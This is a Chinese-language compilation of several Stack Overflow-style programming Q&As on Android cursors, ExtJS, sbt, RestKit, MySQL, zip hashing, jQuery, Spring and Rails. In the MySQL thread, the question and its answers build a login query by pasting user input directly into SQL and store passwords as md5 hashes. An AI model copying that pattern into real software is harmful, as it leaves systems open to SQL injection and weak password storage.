这是我的代码 -*完整的堆栈跟踪在最后*：

```
public class MyClass extends ExpandableListActivity
{
    private Cursor mContactsCursor;
    private ExpandableListView mExpandableListView;

    private Integer mContactId;

    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        setContentView(R.layout.contacts_layout);   

        mExpandableListView.setOnGroupClickListener(new OnGroupClickListener() 
        {
            @Override
            public boolean onGroupClick(ExpandableListView parent, View v, int groupPosition, long id) 
            {
                mContactId = Integer.parseInt(v.getTag(R.id.contact_name).toString());
                return false;
            }
        });
    }

    @Override
    public void onResume()
    {
        super.onResume();
        mContactsCursor = mController.getContacts();
        mExpandableListView.setAdapter(new ContactsExpandableListAdapter(mContactsCursor, this));
    }

    @Override
    public void onPause()
    {
        super.onPause();
        if(!mContactsCursor.isClosed())
            mContactsCursor.close();
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
        if(!mContactsCursor.isClosed())
            mContactsCursor.close();
    }

    public class ContactsExpandableListAdapter extends CursorTreeAdapter
    {
        private TextView mContactNameTextView, mContactNumberTextView, mDurationTextView;

        public ContactsExpandableListAdapter(Cursor cursor, Context context) 
        {
            super(cursor, context);
        }

        @Override
        protected Cursor getChildrenCursor(Cursor groupCursor) 
        {
            return mController.getContactById(mContactId);
        }

        @Override
        protected View newGroupView(Context context, Cursor cursor, boolean isExpanded, ViewGroup viewGroup) 
        {
            View view = LayoutInflater.from(context).inflate(R.layout.listitem_contacts, viewGroup, false);

                ViewHolder viewHolder = new ViewHolder();

                viewHolder.contactName = (TextView) view.findViewById(R.id.contact_name);
                viewHolder.duration = (TextView) view.findViewById(R.id.duration);
                viewHolder.groupIndicator = (ImageView) view.findViewById(R.id.indicator_icon);

viewHolder.contactName.setText(cursor.getString(cursor.getColumnIndex("contact_name")));

                // Set the duration to the view
                viewHolder.duration.setText(cursor.getString(cursor.getColumnIndex("duration_sum")));

                // Set the tags to the view to be used later when the user click the group view.
                // These tags are the contact number, contact id and the the view holder object
                // to be retrieved when binding the group view
                view.setTag(R.id.contact_number, cursor.getString(cursor.getColumnIndex("contact_number")));
                view.setTag(R.id.rlt_main, viewHolder);
                view.setTag(R.id.contact_name, cursor.getString(cursor.getColumnIndex("contact_id")));
            }

            return view;
        }

        @Override
        protected View newChildView(Context context, Cursor cursor, boolean isLastChild, ViewGroup viewGroup) 
        {
            View view = LayoutInflater.from(context).inflate(R.layout.listitem_contacts, viewGroup, false);

                    mContactNumberTextView = (TextView) view.findViewById(R.id.phone_number);
                    mContactNumberTextView.setText(cursor.getString(cursor.getColumnIndex("contact_name")));

                mDurationTextView = (TextView) view.findViewById(R.id.duration);
                mDurationTextView.setText(cursor.getString(cursor.getColumnIndex("duration")));

                view.setTag(cursor.getString(cursor.getColumnIndex("contact_number")));

            return view;
        }

        @Override
        protected void bindGroupView(View view, Context context, Cursor cursor, boolean isExpanded) 
        {
                ViewHolder viewHolder = (ViewHolder) view.getTag(R.id.rlt_main);

                // For each view created, make a query to the database based on the contact id.
                // This is not very wise to do, but will probably be changed in the future.
                Integer contactId = cursor.getInt(cursor.getColumnIndex("contact_id"));

                // Check if the current contact id is equal to -1\. If yes it means the contact

                Cursor currentContactCursor = mFilterByContactController.getContactById(contactId); 

                // Check if the cursor being retrieved from the database based on the current view cursor
                // is major than zero. If yes, it means it has children, so set the indicator icon to this
                // view as visible. If not, set the indicator for this view as gone.
                if(currentContactCursor != null && currentContactCursor.getCount() > 0)
                {
                    viewHolder.groupIndicator.setVisibility(View.VISIBLE);
                    viewHolder.groupIndicator.setImageResource(isExpanded ? R.drawable.expander_ic_maximized : R.drawable.expander_ic_minimized);
                }
                else
                {
                    viewHolder.groupIndicator.setVisibility(View.GONE);
                }

                if(cursor.getString(cursor.getColumnIndex("contact_name")) == null)
                    viewHolder.contactName.setText(cursor.getString(cursor.getColumnIndex("contact_number")));
                else
                    viewHolder.contactName.setText(cursor.getString(cursor.getColumnIndex("contact_name")));

                // Set the duration to the view
                viewHolder.duration.setText(Utils.convertTime(Integer.parseInt(cursor.getString(cursor.getColumnIndex("duration_sum")))));

                // Set the tags to the view to be used later when the user click the group view
                view.setTag(R.id.contact_number, cursor.getString(cursor.getColumnIndex("contact_number")));
                view.setTag(R.id.contact_name, cursor.getString(cursor.getColumnIndex("contact_id")));

                if(!currentContactCursor.isClosed())
                    currentContactCursor.close();
            }
        }

        @Override
        protected void bindChildView(View view, Context context, Cursor cursor, boolean expanded) 
        {
            try
            {
                    if(cursor.getString(cursor.getColumnIndex("contact_name")) == null)
                    {
                        mContactNameTextView = (TextView) view.findViewById(R.id.contact_name);
                        mContactNameTextView.setText(cursor.getString(cursor.getColumnIndex("phone_number")));
                    }
                    else
                    {
                        mContactNumberTextView = (TextView) view.findViewById(R.id.phone_number);
                        mContactNumberTextView.setText(cursor.getString(cursor.getColumnIndex("contact_number")));
                    }

                    mDurationTextView = (TextView) view.findViewById(R.id.duration);
                    mDurationTextView.setText(cursor.getString(cursor.getColumnIndex("duration")));

            }
            catch(Exception e)
            {
                e.printStackTrace();
            }
            finally
            {
                if(cursor.isClosed())
                    cursor.close();
            }
        }
    } 
```

**完整的堆栈跟踪**

```
07-22 16:47:46.388: E/AndroidRuntime(7718): java.lang.IllegalStateException: Couldn t read row 1, col -1 from CursorWindow.  Make sure the Cursor is initialized correctly before accessing data from it. 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.database.CursorWindow.nativeGetLong(Native Method) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.database.CursorWindow.getLong(CursorWindow.java:515) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.database.AbstractWindowedCursor.getLong(AbstractWindowedCursor.java:75)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.widget.CursorTreeAdapter$MyCursorHelper.getId(CursorTreeAdapter.java:436)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.widget.CursorTreeAdapter.getChildId(CursorTreeAdapter.java:173)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.widget.ExpandableListConnector.getItemId(ExpandableListConnector.java:427)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.widget.AdapterView.getItemIdAtPosition(AdapterView.java:756)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.widget.AdapterView.setSelectedPositionInt(AdapterView.java:1128)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.widget.AbsListView.onTouchEvent(AbsListView.java:3147) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.View.dispatchTouchEvent(View.java:5541)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:1951)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:1712) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:1957)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:1726) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:1957)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:1726) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:1957)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:1726) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:1957)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:1726)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at com.android.internal.policy.impl.PhoneWindow$DecorView.superDispatchTouchEvent(PhoneWindow.java:1912)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at com.android.internal.policy.impl.PhoneWindow.superDispatchTouchEvent(PhoneWindow.java:1371)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.app.Activity.dispatchTouchEvent(Activity.java:2364) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchTouchEvent(PhoneWindow.java:1860)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.View.dispatchPointerEvent(View.java:5721)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewRootImpl.deliverPointerEvent(ViewRootImpl.java:2890)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2466)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewRootImpl.processInputEvents(ViewRootImpl.java:845)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2475) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.os.Handler.dispatchMessage(Handler.java:99) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at android.os.Looper.loop(Looper.java:137) 07-22 16:47:46.388: E/AndroidRuntime(7718):  at android.app.ActivityThread.main(ActivityThread.java:4424)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at java.lang.reflect.Method.invokeNative(Native Method)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at java.lang.reflect.Method.invoke(Method.java:511) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
07-22 16:47:46.388: E/AndroidRuntime(7718):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 
07-22 16:47:46.388: E/AndroidRuntime(7718):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-22T21:29:32.053

正如@Jens 在评论中提到的那样：

> 它是在寻找一个行标识符（即 BaseColumns#_ID）却没有在游标中找到它吗？您在 mContactsCursor 中使用了哪些列 - 您没有忘记其中的行 ID？

在所有查询中，`_id`必须指定列。这就是导致错误的原因，在我将列添加`_id`到查询后，它起作用了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-09T06:25:45.597

即使我们有 _ID，我们甚至可能会收到此错误。如果我们在查询中给出了错误的 field_name 或在意图或任何使用的地方传递了 field_name，就会发生这种情况。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-28T15:08:03.400

如果您使用`ContentProvider`查询，您需要添加至少 _id 到 PROJECTION

# extjs4 - 使用复选框过滤 - 逻辑问题

> ID：11603596
> 
> 赞同：0
> 
> 时间：2012-07-22T20:07:02.050
> 
> 标签：extjs4, extjs4.1

我有一个`grouped Checkbox`，里面有 4 个`checkboxes`。

当用户选择一个复选框时，我需要根据文本框的值过滤数据存储。当我选择 2 个文本框时，我得到 的输出`["Albert","Francis"]`，当我只选择第一个文本框时，我得到`["Albert"]`等等。

现在，我需要知道如何过滤这个？

```
onCheckBoxGroupChange : function (field,newValue,oldValue,options) {
var chkv=newValue.chb;
console.log (chkv);
var st= Ext.getStore('People'); 
        st.on('load', function() {
           st.filter({
               filterFn: function(rec) {                   
                   return rec.get('name') == chkv; 
```

我遇到的问题是，当我同时选择`CheckBoxes`,时`chkv`变成`["Albert","Francis"]`（像数组一样），因此我无法返回值，因为`rec.get('name') == chkv;`不查找数组。

有人能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T23:18:55.140

关于什么：

```
filterFn: function(rec) {
    return Ext.Array.contains(chkv, rec.get('name'));
} 
```

我想确保你知道如果你想过滤它，你不必重新加载商店。看起来这就是您在上面提供的代码段中所做的。

实际上还有其他问题，您的`onCheckBoxGroupChange`处理程序实际上会做什么（如果您按照上面的方式保留它），如下所示：

每次用户单击复选框时，它都会首先从服务器重新加载商店，然后将选定的过滤器添加到商店的过滤器中，然后通过它保存的过滤器过滤商店。

例如：

用户点击“Albert”复选框

```
Store reloads 
Store adds `["Albert"]` filter function 
Store performs filtering with `["Albert"]` filter function 
```

用户点击“Francis”复选框

```
Store reloads
Store adds `["Albert", "Francis"]` filter function
Store performs filtering with `["Albert"]` filter function
Store performs filtering with `["Albert", "Francis"]` filter function 
```

用户*取消点击*“Albert”复选框

```
Store reloads
Store adds `["Francis"]` filter function
Store performs filtering with `["Albert"]` filter function
Store performs filtering with `["Albert", "Francis"]` filter function
Store performs filtering with `["Francis"]` filter function 
```

您将逐渐获得越来越多的过滤器。加上不必要的多次重新加载商店。我不认为那是你想要的。

[您应该查看有关数据存储过滤](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Store-method-filter)的文档，以获取有关如何进行此操作的更多数据。

另外，在您的问题中，您说当您选择两个复选框时遇到了这个问题，因为它返回了一个数组。根据您的问题文本，当您选择一个复选框 ( `["Albert"]`) 时，您还会获得一个数组。它只有一个项目，但它是一个数组。

这就是为什么我的解决方案（要求你的`chkv`变量是一个数组）会起作用的原因。

# sbt - 具有基本身份验证的 sbt 依赖解析器

> ID：11603607
> 
> 赞同：16
> 
> 时间：2012-07-22T20:08:10.383
> 
> 标签：sbt, ivy, basic-authentication

我的 Maven 存储库具有基本授权的 nginx。

我的 build.sbt 有：

```
credentials += Credentials("maven repository", "rep.com", "sbt", "password")

resolvers ++= Seq(
  "maven repository" at "http://rep.com:8080/"
) 
```

但是，sbt 找不到模块，因为 sbt 不使用基本授权。

我的 nginx 日志如下所示：

```
012/07/22 20:02:21 [error] 3338#0: *14 no user/password was provided for basic authentication, client: 8.32.39.29, server: rep.com, request: "HEAD /some/cool_2.9.1/0.1-SNAPSHOT/cool_2.9.1-0.1-SNAPSHOT.pom HTTP/1.1", host: "rep.com:8080" 
```

我不想通过 nginx 发布工件。基本身份验证仅需要对工件进行受限访问。

如何在 sbt 中限制访问和使用存储库？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-13T14:21:37.550

将以下内容添加到您的 ~/.ivy2/.credentials 中怎么样：

```
realm=maven repository
host=rep.com:8080
user=username
password=password 
```

然后使用`Credentials(Path.userHome / ".ivy2" / ".credentials")`

您需要确保您的领域配置正确：（`curl http://rep.com:8080 -vv 2>&1 | egrep "realm|host"`我可能弄错了，但“主机”可能必须匹配主机标头，即rep.com:8080，而不仅仅是rep.com）。

hth

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-01-07T09:22:37.613

我对使用基本 AUTH 的 SVN 存储库有同样的问题。这篇文章和上面提到的那个让我得到了我在下面总结的答案。

正如上面提到的关于正确处理领域的所有内容：

在 build.sbt 我设置我的解析器如下：

```
resolvers += {
Credentials.add("<realm>", "<svnhost?", "<username>", "<password>")
Resolver.url("name", url("http://<svnhost>/<path>/"))(Resolver.ivyStylePatterns) 
} 
```

为了找到作为 Credentials.add 的第一个参数的领域值，我做了

```
curl http://<svn host> -v 
```

并使用 WWW-Authenticate 标头中报告的 Basic Realm 值：

```
WWW-Authenticate: Basic realm="<realm>" 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:21:46.150

不知道它是否有效，但只需尝试在 URL 中添加基本身份验证：

```
resolvers ++= Seq(
  "maven repository" at "http://username:password@rep.com:8080/"
) 
```

# ios - 使用 RestKit 对静态库进行单元测试

> ID：11603612
> 
> 赞同：1
> 
> 时间：2012-07-22T20:09:10.767
> 
> 标签：ios, xcode, unit-testing, restkit, sentestingkit

我正在尝试遵循 RestKit 单元测试指南（[https://github.com/RestKit/RestKit/wiki/Unit-Testing-with-RestKit](https://github.com/RestKit/RestKit/wiki/Unit-Testing-with-RestKit)），但我的项目是静态库而不是应用程序。

这是我写的测试：

```
- (void)testMappingOfDate
{
    id parsedJSON = [RKTestFixture parsedObjectWithContentsOfFixture:@"plan.json"];
    RKMappingTest *test = [RKMappingTest testForMapping:[self planMapping] object:parsedJSON];
    [test expectMappingFromKeyPath:@"plan.date" toKeyPath:@"date"];
    STAssertNoThrow([test verify], nil);
} 
```

当我尝试运行测试时，我在测试的第一行收到此错误：

```
error: testMappingOfDate (api_clientTests) failed: -[NSBundle parsedObjectWithContentsOfResource:withExtension:]: unrecognized selector sent to instance 0x1765c40 
```

似乎它没有找到由 RestKit 定义的 NSBundle 类别，但是我的测试目标标头搜索路径设置为，`"$(BUILT_PRODUCTS_DIR)/../../Headers"`并且我已经验证了该路径包括`NSBundle+RKAdditions.h`其中包含假定的“无法识别的选择器”。

我在这里缺少什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:33:58.547

您正在尝试在来自库的二进制文件中包含一个类别。为了实现这一点，您需要将以下内容添加到您的（单元测试目标的）构建设置中。

其他链接器标志：-ObjC

![在此处输入图像描述](../Images/e351c171dc1401a1d3a792bb2cba8c37.png)

[来自 Apple 的 QA](http://developer.apple.com/library/mac/#qa/qa1490/_index.html)：

> Objective-C 没有为每个函数（或 Objective-C 中的方法）定义链接器符号 - 相反，链接器符号只为每个类生成。如果您使用类别扩展预先存在的类，则链接器不知道将核心类实现的目标代码与类别实现相关联。这可以防止在生成的应用程序中创建的对象响应类别中定义的选择器。

解决方案：

> 要解决此问题，静态库应将 -ObjC 选项传递给链接器。此标志使链接器加载定义了 Objective-C 类或类别的库中的每个目标文件。虽然此选项通常会导致更大的可执行文件（由于加载到应用程序中的附加目标代码），但它将允许成功创建包含现有类的类别的有效 Objective-C 静态库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:16:57.990

该错误意味着“无法识别的选择器”问题在运行时。编译器和 NSBundle+RKAdditions.h 在编译 timr 时不会给出这个错误。

问题是该代码`@implementation NSBundle(RKAdditions)`未链接到您的应用程序中。所以你需要把它添加到你的构建中

# mysql - 在 SELECT 语句中的 WHERE 子句中进行 SELECT

> ID：11603614
> 
> 赞同：1
> 
> 时间：2012-07-22T20:09:37.557
> 
> 标签：mysql

我不确定正确的技术措辞，所以请原谅我的标题，但这就是问题所在。我有一个 MySQL 数据库，在用户表中我有 *user_name*、一个 *password_salt* 和一个包含密码和 salt的 md5*密码。*在一个程序中，用户连接，我收到一个要发送的查询以验证用户。当用户连接时，我需要一种方法来选择他们的用户名，并将给定的密码与存储的密码进行比较，这需要在 WHERE 语句的某处检索盐（我猜）。

这是我假设的“例子”：

```
SELECT user_name 
FROM users 
WHERE user_name='$nick' AND 
      password = md5(CONCAT('$md5pass', md5((select password_salt FROM users where user_name='$nick')))) 
LIMIT 1 
```

分辨率更新：得到它的工作，感谢您的建议，一个正常的选择就足够了，问题是 sql-auth api 没有收到密码，除非指定了端口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:15:11.270

实际上，您不仅可以在“SELECT”子句中，还可以在“WHERE”子句中自由使用“FROM”子句中声明的表中的任何列，所以我认为这里不需要子查询。简单地说：

```
SELECT user_name 
FROM users 
WHERE user_name='$nick' AND 
      password = md5(CONCAT('$md5pass', md5(password_salt))) 
LIMIT 1 
```

这样，只有当它同时匹配时才会选择一行： - 用户名是正确的 - 行中的密码与给定的密码匹配

我不确定我是否正确使用了 md5() 函数。我复制了你的例子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:15:00.223

SELECT user_name FROM users WHERE user_name='$nick' AND password = md5(CONCAT('$md5pass', password_salt)) LIMIT 1

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:15:48.147

试试这个：

```
SELECT user_name 
FROM users 
WHERE user_name='$nick' AND 
      password = md5(CONCAT('$md5pass', md5(password_salt))) 
LIMIT 1 
```

# php - Zip 文件包含相同的文件但具有不同的哈希值？

> ID：11603615
> 
> 赞同：12
> 
> 时间：2012-07-22T20:09:44.440
> 
> 标签：php, zip, md5-file

我使用 php 创建了数百个文件夹和文本文件，然后将它们添加到 zip 存档中。

这一切都很好，但如果我使用相同的文件夹和文件创建另一个 zip 存档，新存档将具有与第一个不同的哈希。如果我使用 winrar 而不是 php 创建存档，这也是一样的。

当我压缩通过 php 创建的文件时，它似乎只显示不同的哈希值，但它们打开得很好。

非常奇怪，有人对此有所了解吗？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2020-05-11T18:57:30.970

Zip 不是确定性的。为了解决这个 zip 问题（例如，当您有 CI 并且需要更新 AWS lambda 并且不想每次都更新它时，这确实是个问题，但只有在真正改变了某些东西时）我使用了这篇文章：[https:// medium.com/@pat_wilson/building-deterministic-zip-files-with-built-in-commands-741275116a19](https://medium.com/@pat_wilson/building-deterministic-zip-files-with-built-in-commands-741275116a19)
像这样：

```
find . -exec touch -t "$(git ls-files -z . | \
  xargs -0 -n1 -I{} -- git log -1 --date=format:"%Y%m%d%H%M" --format="%ad" '{}' | \
  sort -r | head -n 1)" '{}' +
zip -rq -D -X -9 -A --compression-method deflate dest.zip sources... 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-22T20:25:09.473

文件肯定有一些差异。如果长度不完全相同，则哈希将不同。您可以使用比较十六进制编辑器（例如 Hex Workshop）来查看到底有什么区别。

我想到的可能性：

1.  正如@orn 所提到的，您使用的 zip 格式中可能有一个时间戳（不确定）。
2.  文件添加到存档的顺序可能不同（取决于您选择它们​​/构建源数组的方式）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-03-03T01:42:47.803

您可以考虑使用[确定性](https://github.com/bboe/deterministic_zip)_zip 它解决了这个问题，从它的文档：

> 构建确定性 zip 的三个技巧：

> 文件必须以相同的顺序添加到 zip。目录迭代顺序可能因机器而异，从而导致不同的 zip。确定性_zip 在将所有文件添加到 zip 存档之前对其进行排序。zip 中的文件必须具有一致的时间戳。如果我将目录共享到另一台计算机，则各个文件的时间戳可能会有所不同，尽管它们具有相同的内容。为了实现时间戳的一致性，deterministic_zip 将所有添加文件的时间戳设置为 2019-01-01 00:00:00。

> zip 中的文件必须具有一致的权限。文件权限看起来像 -rw-r--r-- 对于所有用户都可以读取的文件，并且只能由拥有该文件的用户写入。类似地，可执行文件可能具有如下所示的权限：-rwxr-xr-x 或 -rwx------。deterministic_zip 将添加到存档的所有文件的权限设置为 -r--r--r-- 或 -r-xr-xr-x。后者仅在运行确定性_zip 的用户对文件具有执行访问权限时使用。

> 注意：deterministic_zip 不会修改或更新它添加到档案中的任何文件的时间戳。上面使用的技术仅适用于确定性压缩文件中创建的文件副本。

# javascript - 在类中插入随机数

> ID：11603618
> 
> 赞同：2
> 
> 时间：2012-07-22T20:10:11.740
> 
> 标签：javascript, jquery, random

如果我这样做：

```
$('.classname').html(Math.floor(Math.random()*10)+1); 
```

所有的“类名”都用相同的数字填充。是否可以用不同的随机数填充“类名”的每个实例？

我能想到的解决这个问题的唯一可能方法是遍历“类名”的每个实例并一个一个地应用一个随机数。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T20:15:05.203

[.html()](http://api.jquery.com/html/)

```
$(".classname").html(function(idx, oldValue) {
    return (Math.floor(Math.random()*10)+1);
}); 
```

[小提琴](http://jsfiddle.net/B8ZgS/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-22T20:17:45.527

html 方法有一个接受函数的“重载”。该函数应返回将内部 html 设置为的值。在您的情况下，您可以执行以下操作：

```
$(".classname").html(function() {
    return (Math.floor(Math.random()*10)+1);
}); 
```

该函数实际上是用两个参数调用的。第一个是选择中元素的索引，第二个是元素内部html的当前值

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-22T20:11:51.317

您可以使用 jQuery 的`.each()`函数来遍历与您提供的选择器匹配的每个元素 -

```
$.each('.classname',function(index,elem){
  var newRandomNumber = (Math.random()*10)+1;
  $(elem).html(Math.floor(newRandomNumber));
}); 
```

对于`each()`函数的每次迭代，您将`index`在参数中拥有您所在元素的 和元素本身`elem`。

* * *

[http://api.jquery.com/jQuery.each/](http://api.jquery.com/jQuery.each/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-22T20:11:30.397

试试这个

```
$('.classname').each(function(index) {
    $(this).html(Math.floor(Math.random()*10)+1);
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-22T20:11:14.843

是的。最简单的方法是使用 jQuery [each](http://api.jquery.com/jQuery.each/)函数：

```
$('.classname').each(function() {
    $(this).html(Math.floor(Math.random()*10)+1);
}); 
```

# spring - 不使用 spring taglib 的数据绑定

> ID：11603619
> 
> 赞同：3
> 
> 时间：2012-07-22T20:10:14.970
> 
> 标签：spring, data-binding, spring-mvc, taglib

我的 html 是在没有使用 spring taglib 的情况下构建的，现在我想将表单的参数绑定到我的控制器中的一个对象。

目前我的表格看起来像这样

```
<form>
<input type="text" name="frAccUserMgmt.userName"/>
<input type="password" name="frAccUserMgmt.userPwd"/>
</form> 
```

我的对象的相关部分是

```
Class FrAccUserMgmt {
    private String userName;
    private Strint userPwd;
    // getter and setter
} 
```

我的控制器是

```
@RequestMapping("login")
Public ModelAndView doLogin(FrAccUserMgmt frAccUserMgmt) {
    //code
} 
```

我该如何去绑定它。目前绑定没有发生。我只是在我的代码中得到一个空对象。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T03:40:09.753

您可以尝试`BindingResult`在方法签名中包含该类，然后查看是否有任何绑定错误：

```
@RequestMapping("login")
Public ModelAndView doLogin(FrAccUserMgmt frAccUserMgmt, BindingResult result) {
    if (result.hasErrors()) {
        logger.warn("BindingResult errors: " + result.toString());
    }
    //code
} 
```

`frAccUserMgmt`从表单字段名称中删除部分。Spring会根据命令对象中定义的getter和setter，自动找到命令对象绑定请求参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-08T17:47:37.937

这也可以通过为应该使用请求参数填充的参数 bean 添加 @ModelAttribute 来完成。

根据春季文档

[http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html#mvc-ann-modelattrib-method-args（16.3.3.8](http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html#mvc-ann-modelattrib-method-args) 在方法参数上使用@ModelAttribute )

方法参数上的 @ModelAttribute 指示应从模型中检索该参数。如果模型中不存在，则应首先实例化参数，然后将其添加到模型中。一旦出现在模型中，参数的字段应该从具有匹配名称的所有请求参数中填充。这在 Spring MVC 中称为数据绑定，这是一种非常有用的机制，可以让您不必单独解析每个表单字段。

# ruby-on-rails-3 - 通过 Rails 中的自定义查询关联记录

> ID：11603625
> 
> 赞同：0
> 
> 时间：2012-07-22T20:11:04.000
> 
> 标签：ruby-on-rails-3, activerecord

我有两个通过 has_many/belongs_to 关联连接的模型：

```
Class Project < ActiveRecord::Base
  has_many :tasks
end

Class Tasks < ActiveRecord::Base
  belongs_to :project
end 
```

每个任务都标记有 HABTM 关系：

```
Class Tasks < ActiveRecord::Base
  belongs_to :project
  has_and_belongs_to_many :tags
end 
```

我正在尝试根据标签 ID 获取项目列表。`Project`我可以通过在我的模型上使用类方法来获取具有特定标记的任务的项目列表：

```
def by_tag(tag_id)
  Project.joins(:tasks => :tags).where(:tags => {:id = tag_id})
end 
```

理想情况下，我希望能够在我的视图中列出给定标签的所有项目及其相关任务。`project.tasks`如果我对项目使用典型的查找，我通常可以通过使用来获取属于给定项目的任务列表`Project.find(1)`。

但是，当我尝试`project.tasks`使用我的新类方法找到的结果时`Project.by_tag(1)`，我收到“NoMethodError: Undefined Method 'tasks'”错误。

我查看了命名范围以通过标记结果获取项目，但似乎人们正在远离这种方法，转而支持类方法。真的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:36:03.810

在您的项目模型上，您需要将其添加到类而不是实例中。另请注意，这会将 self 对象提升到类，因此您可以消除“项目”。除非你想明确。

```
class << self
  def by_tag(tag_id)
    joins(:tasks => :tags).where(:tags => {:id = tag_id})
  end
end 
```

关于什么是最好的方法总是存在争议。我自己更喜欢任何能更快完成工作的方法。我个人喜欢范围，但每个人都喜欢。

# javascript - 使用对象键作为参数的可读方式

> ID：11603626
> 
> 赞同：0
> 
> 时间：2012-07-22T20:11:13.610
> 
> 标签：javascript, object

我正在使用对象的键和值来填充其他对象，如下所示：

```
var default_columns = {
    column_a: 'value_a',
    column_b: 'value_b',
    column_c: 'value_c'
// [...]
}

var new_object = {};
for (var key in default_columns) {
    new_object[key] = default_columns[key];
} 
```

但是稍后在我的程序中，我想将这些键重新用作参数。我可以做这样的事情：`new_object['column_a']`但如果我改变`'column_a'`了，`default_columns`我需要在代码中的任何地方更新它。

我想过像这样定义我的对象：

```
var default_columns = {
    a: { k: 'column_a', v: 'value_a' },
    b: { k: 'column_b', v: 'value_b' },
    c: { k: 'column_c', v: 'value_c' }
} 
```

并按如下方式遍历它：

```
var new_object = {};
for (var key in default_columns) {
    new_object[default_columns[key].k] = default_columns[key].v;
} 
```

这也将允许我将键用作参数 ( `new_object[default_columns.a.k]`)，同时让我有机会更改键（例如更改`'column_a'`为`'my_column_a'`）`default_columns`而无需更新代码。

**有没有一种更易读的方式来做我试图用第二种方法实现的目标？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T10:27:22.177

在我看来，原型继承就是你想要的。与其将所有属性从`default_columns`to复制到`new_object`with `Object.extend`，不如让它们彼此继承 ( [`Object.create`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/create/))！

```
var new_object = Object.create(default_columns);

// or, in other words:

function Columns(){}
/* var default_columns = */ Columns.prototype = {
    column_a: 'value_a',
    ...
};

var new_object = new Columns(); 
```

然后，您可以覆盖 上的某些列`new_object`，这将隐藏继承的属性。

* * *

